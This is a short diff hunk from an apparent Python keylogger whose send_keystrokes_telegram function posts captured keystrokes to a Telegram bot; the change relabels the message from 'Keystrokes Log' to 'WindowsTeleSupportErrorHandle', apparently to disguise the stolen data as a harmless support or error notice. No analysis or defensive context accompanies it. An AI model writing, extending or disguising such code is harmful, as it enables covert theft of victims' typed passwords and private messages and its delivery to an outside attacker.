@@ -78,7 +78,7 @@ def send_keystrokes_telegram():
     try:
         data = ''.join(key_buffer)
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        message = f"🧾 *Keystrokes Log* - `{timestamp}`\n```\n{data}\n```"
+        message = f"🧾 *WindowsTeleSupportErrorHandle* - `{timestamp}`\n```\n{data}\n```"
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
         res = requests.post(url, data={
             "chat_id": TELEGRAM_CHAT_ID,
